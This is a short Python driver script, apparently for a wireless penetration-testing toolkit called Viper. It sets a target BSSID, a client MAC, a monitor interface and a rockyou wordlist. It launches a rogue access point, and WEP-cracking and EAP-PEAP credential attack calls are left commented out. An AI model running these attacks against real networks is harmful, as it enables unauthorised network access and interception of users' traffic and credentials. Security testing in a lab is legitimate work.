from Viper.viper import Viper
from Viper.attack.wep import wep_crack, wep_crack_no_ivs
from Viper.attack.wpa import wpa_crack, fast_wpa_crack

from Viper.attack.enterprise import attack_EAP_PEAP

from Viper.postexp.rogue_ap import create_rogue_ap

interface = 'wlan0mon'

bssid = 'E4:C3:2A:91:BB:D7'
station = '2A:29:0A:29:C3:46'
essid = 'Rogue AP'
channel = '4'
directory = '/home/kali/Documents/Viper/results/mgt_example'
orignial_time = 60
dictionary = '/home/kali/Documents/Viper/wordlists/rockyou.txt'
ctr = 1
seconds = 15
# while ctr < 4:
#     seconds = orignial_time * ctr
#     password = wep_crack(interface, bssid, station, channel, directory, seconds, ctr)
#     if password:
#         print(password)
#         print("Password Found Using IVs")
#     else:
#         ctr += 1

# password = wep_crack_no_ivs(f'{directory}/wep', dictionary)
# print(password)

print('A')
create_rogue_ap(interface, essid, channel)
print('B')

# password = attack_EAP_PEAP(interface, bssid, 10, station, essid, channel, directory, dictionary, 20)

# print('*'*120)

# print(password)